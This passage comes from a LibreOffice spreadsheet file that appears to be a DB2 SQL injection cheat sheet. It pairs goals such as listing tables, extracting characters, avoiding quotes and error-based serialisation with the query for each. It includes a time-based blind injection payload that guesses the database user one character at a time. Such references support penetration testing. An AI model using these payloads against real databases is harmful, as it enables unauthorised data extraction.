          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select distinct(grantee) from sysibm.systabauth where CONTROLAUTH=’Y’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Current Database</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select current server from sysibm.sysdummy1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Databases*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select distinct(table_catalog) from sysibm.tables</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro38">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Columns*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select name, tbname, coltype from sysibm.syscolumns — also valid syscat and sysstat</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro38">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select table_name from sysibm.tables</text:p>
            <text:p><text:span text:style-name="T2">Select name from sysibm.systables</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Find Tables From Column Name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select tbname from sysibm.syscolumns where name=’username’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro38">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Select Nth Row*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Select Nth Char</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select substr(‘abc’,2,1) FROM sysibm.sysdummy1 — returns b</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro38">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Bitwise AND/OR/NOT/XOR*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select bitand(1,0) from sysibm.sysdummy1 — returns 0. Also available bitandnot, bitor, bitxor, bitnot</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ASCII Value -&gt; Char</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select chr(65) from sysibm.sysdummy1 — returns ‘A’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Char -&gt; ASCII Value</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select ascii(‘A’) from sysibm.sysdummy1 — returns 65</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro38">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Casting</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select cast(‘123’ as integer) from sysibm.sysdummy1</text:p>
            <text:p><text:span text:style-name="T2">Select cast(1 as char) from sysibm.sysdummy1</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro38">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String Concat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select ‘a’ concat ‘b’ concat ‘c’ from sysibm.sysdummy1 — returns ‘abc’</text:p>
            <text:p><text:span text:style-name="T2">Select ‘a’ || ‘b’ from sysibm.sysdummy1 — returns ‘ab’</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IF Statement*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Seems only allowed in stored procedures. Use case logic instead.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro38">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Case Statement*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select CASE WHEN (1=1) THEN ‘AAAAAAAAAA’ ELSE ‘BBBBBBBBBB’ END from sysibm.sysdummy1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro38">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Avoiding Quotes*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1 — returns “ADRI”. Works without select too</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro39">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Time Delay*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Heavy queries, for example:</text:p>
            <text:p><text:span text:style-name="T2">‘ and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)&gt;0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 — If user starts with ascii 68 (‘D’), the heavy query will be executed, delaying the response. However, if user doesn’t start with ascii 68, the heavy query won’t execute and thus the response will be faster.</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro40">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Serialize to XML (for error based)*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select xmlagg(xmlrow(table_schema)) from sysibm.tables — returns all in one xml-formatted string</text:p>
            <text:p/>
            <text:p><text:span text:style-name="T2">Select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) — Same but without repeated elements</text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T2">select xml2clob(xmelement(name t, table_schema)) from sysibm.tables — returns all in one xml-formatted string (v8). May need CAST(xml2clob(… AS varchar(500)) to display the result.</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Make DNS Requests</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>N/A</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Command Execution</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Seems it’s only allowed from procedures or UDFs.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Local File Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>I think this is only available through stored procedures or db2 tool.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro38">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Hostname/IP and OS INFO*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info — requires priv</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro38">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Location of DB Files*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select * from sysibmadm.reg_variables where reg_var_name=’DB2PATH’ — requires priv</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro41">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>System Config*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select dbpartitionnum, name, value from sysibmadm.dbcfg where name like ‘auto_%’ — Requires priv. Retrieve the automatic maintenance settings in the database configuration that are stored in memory for all database partitions.</text:p>
            <text:p/>
            <text:p><text:span text:style-name="T2">Select name, deferred_value, dbpartitionnum from sysibmadm.dbcfg — Requires priv. Retrieve all the database configuration parameters values stored on disk for all database partitions.</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro37">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Default System Databases*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>What makes sense for DB2 is to know default System Schemas (and maybe tables):</text:p>
            <text:p>SYSIBM/SYSCAT/SYSSTAT/SYSPUBLIC/SYSIBMADM/SYSTOOLS</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <table:named-expressions/>
      <table:database-ranges>
        <table:database-range table:name="__Anonymous_Sheet_DB__1" table:target-range-address="MySQL.A1:MySQL.B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4">00/00/0000</text:date>, <text:time style:data-style-name="N2" text:time-value="13:16:45.6209345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21:04:19.892430956</meta:creation-date>
    <dc:date>2018-11-14T17:44:48.040797007</dc:date>
    <meta:editing-duration>PT14H36M2S</meta:editing-duration>
    <meta:editing-cycles>35</meta:editing-cycles>
    <meta:generator>LibreOffice/6.1.3.1$Linux_X86_64 LibreOffice_project/10$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="4" meta:cell-count="883" meta:object-count="0"/>
  </office:meta>
</office:document-meta>
</file>